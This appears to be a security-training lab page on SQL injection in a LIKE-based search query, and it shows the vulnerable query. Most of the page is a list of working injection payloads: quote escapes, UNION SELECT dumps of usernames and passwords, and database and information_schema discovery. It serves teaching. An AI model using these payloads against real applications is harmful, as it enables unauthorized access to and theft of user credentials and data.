Lab 3: Search-Based SQL Injection
Learn SQL injection in LIKE-based search queries
Objective: This lab demonstrates SQL injection in search functionality. The query structure is: SELECT id, username, password FROM labsPage_user WHERE username LIKE '%{search_term}%'

LIKE Injection Strategy: The search term is wrapped in quotes and wildcard (%). Use these techniques:
  • admin - Normal search for usernames containing "admin"
  • ' OR 1=1-- - Close quote, inject OR condition, comment out rest
  • ' UNION SELECT 1,2,3-- - UNION injection to test column count
  • ' UNION SELECT id,username,password FROM labsPage_user-- - Extract all users
  • %' OR '1'='1 - Alternative injection without comments

Search-Based SQL Injection Hints
Basic LIKE Injection:
Quote escape: ' OR 1=1--
Alternative: %' OR '1'='1
Always true: ' OR 'a'='a
UNION Attacks:
Column test: ' UNION SELECT 1,2,3--
All users: ' UNION SELECT id,username,password FROM labsPage_user--
Email data: ' UNION SELECT 1,email_id,'email' FROM labsPage_email--
Information Gathering:
Database info: ' UNION SELECT 1,database(),version()--
Table discovery: ' UNION SELECT 1,table_name,'table' FROM information_schema.tables--
Column discovery: ' UNION SELECT 1,column_name,'column' FROM information_schema.columns WHERE table_name='labsPage_user'--
Boolean-Based Tests:
Count records: ' AND (SELECT COUNT(*) FROM labsPage_user)>0--
Username check: ' AND (SELECT COUNT(*) FROM labsPage_user WHERE username='admin')>0--
